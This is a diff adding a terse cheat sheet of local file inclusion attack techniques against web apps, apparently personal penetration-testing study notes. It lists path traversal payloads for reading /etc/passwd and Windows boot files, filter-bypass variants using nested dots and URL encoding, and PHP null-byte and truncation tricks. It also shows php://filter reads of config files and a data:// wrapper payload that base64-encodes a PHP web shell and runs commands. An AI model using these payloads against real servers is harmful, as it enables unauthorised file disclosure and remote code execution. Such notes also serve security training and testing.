@@ -1,0 +1,129 @@
+File inclusions
+
+enum:
+|
+|--- file inclusions happens when no defence mechs like sanitization or WAF is not present
+|
+|--- often these vulns are found in template engines
+|
+|--- 'bookstore.com/search.php?books=/etc/passwd' or 'books=/C:\Windows\boot.ini'
+|
+|--- the above doesn't always work, so try '../' or '/../'
+
+second order:
+|
+|--- incorrectly pulling files from the back end server
+|
+|--- name a file that matches the file on the server
+ \
+  --- sign up with username '/etc/passwd' 
+  |
+  |--- download your pfp 
+  |
+  |--- the server will garb the local file 
+
+Non recursive:
+|
+|--- a common but insecure to protect againts lfi is to remove the substr <- '/../../../'
+|
+|--- to move around this <- '//....//....//....//'
+|
+|--- can also do '..././' and '....\/'
+
+encoding:
+| 
+|--- it is common for a webapp  to filter out charecters like '.' and '/'
+|
+|--- so encode them
+|
+|--- %2e%2e%2f <- ../
+|
+|--- can also double encode if needed
+
+approved:
+|
+|--- certain web apps would only allow paths under a certain directory
+|
+|--- bookstore.com/search.php?books=Fiction/../../../../etc/passwd
+|
+|--- might to combine both techniques to work
+
+obsolete technique:
+|
+|--- try these if the php version is 5.3/5.4
+|
+\
+ path truncation:
+ |
+ |--- in php, strings had a max of 4096 charecters due to 32-bit systems
+ |
+ |--- any value past that would get truncated
+ |
+ |--- ../../../etc/passwd/../..[etc...]
+ 
+ null bytes:
+ |
+ |--- in versions before 5.5, we could add an null byte(%00)
+ |
+ |--- this would terminate the string and will not consider anything after
+ |
+ |--- /etc/passwd%00 or /ect/passwd%00.php if needed
+
+input filters:
+|
+|--- wrappers allow us to access I/O streams, file descriptors, memory streams
+|
+|--- php filters are a type of wrapper where input can be filterd
+|
+|--- use the 'php://' to use the wrapper and 'php://filter' to access the filter wrapper
+|
+|--- php://filter/read=convert.base64-encode/resource=config
+|
+|--- the filtere wrapper has a handful of parameters, but resource and read are the main focus
+|
+|--- the resource param is required and it is for filter wrappers
+|
+|--- we can specify the stream we can apply on the filter(like a local file for instace)
+|
+|--- the read param can apply diffrent filters on the input resource
+|
+|--- most useful filter is the base64 conversion filter
+
+data wrapper:
+|
+|--- this wrapper is used to include external data like php code
+|
+|--- the 'allow_url_include' needs to be enabled
+|
+|--- to check if its enabled
+|
+|--- apache: /etc/php/<php.version>/apache2/php.ini <- depending on the target the ext may not be needed
+|
+|--- nginx: /etc/php/<php.version>/fpm/php.ini
+|
+|--- try earlier version of php if we cant locate the cofig file
+|
+|--- use the base64 filter to avoid breaking
+|
+|--- /index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+|
+|--- after that we can perform code execution
+|
+|--- /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+
+Input wrapper:
+|
+|--- like the data wrapper, but the difference is the input passed to the wrapper as a post request
+|
+|--- meaning that a param must accept a post request
+|
+|--- this wrapper also has 'allow_url_include'
+
+Expect wrapper:
+|
+|--- with this wrapper we can run commands up front through url streams
+|
+|--- this is an external wrapper and needs to be insatlled on the backend
+|
+|--- can use the 'expect://' scheme and pass commands
+
